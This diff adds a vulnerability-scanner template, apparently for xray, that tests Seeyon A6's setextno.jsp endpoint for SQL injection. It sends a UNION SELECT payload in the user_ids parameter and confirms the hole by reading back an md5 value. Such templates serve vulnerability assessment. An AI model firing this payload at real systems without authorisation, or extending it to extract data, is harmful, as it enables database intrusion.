@@ -1,0 +1,13 @@
+name: poc-yaml-seeyon-setextno-jsp-sql
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: GET
+    path: /yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17)%20union%20all%20select%201,2,@@version,md5({{rand}})%23
+    expression:
+      response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
+detail:
+  author: sakura404x
+  version: 致远A6
+  links:
+    - https://github.com/apachecn/sec-wiki/blob/c73367f88026f165b02a1116fe1f1cd2b8e8ac37/doc/unclassified/zhfly3348.md
